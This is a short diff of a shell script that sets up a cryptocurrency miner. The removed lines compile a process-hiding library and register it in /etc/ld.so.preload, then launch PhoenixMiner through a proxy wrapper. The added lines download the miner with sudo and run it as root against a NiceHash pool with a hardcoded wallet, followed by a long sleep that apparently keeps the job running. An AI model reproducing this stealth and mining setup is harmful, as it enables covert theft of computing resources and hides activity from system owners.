@@ -33,11 +33,8 @@ echo " "
 echo " "
 echo " "
 
-./graftcp/graftcp https://phoenixminer.info/downloads/PhoenixMiner_6.2c_Linux.tar.gz
-
-make
-gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
-mv libprocesshider.so /usr/local/lib/
-echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
-
-./graftcp/graftcp ./PhoenixMiner -pool stratum+tcp://daggerhashimoto.hk.nicehash.com:3353 -wal 343QVQVLGBkJdmb2KPhzR6b3JyUFsXQb7G.Nasgor_Enak-$(echo $(shuf -i 1-99 -n 1)) -pass vapers -proto 4 -stales 0
+sudo wget https://phoenixminer.info/downloads/PhoenixMiner_6.2c_Linux.tar.gz
+tar -xf PhoenixMiner_6.2c_Linux.tar.gz
+cd PhoenixMiner_6.2c_Linux
+sudo ./PhoenixMiner -pool stratum+tcp://daggerhashimoto.hk.nicehash.com:3353 -wal 343QVQVLGBkJdmb2KPhzR6b3JyUFsXQb7G.Nasgor_Enak-$(echo $(shuf -i 1-99 -n 1)) -pass vapers -proto 4 -stales 0
+sleep 99999
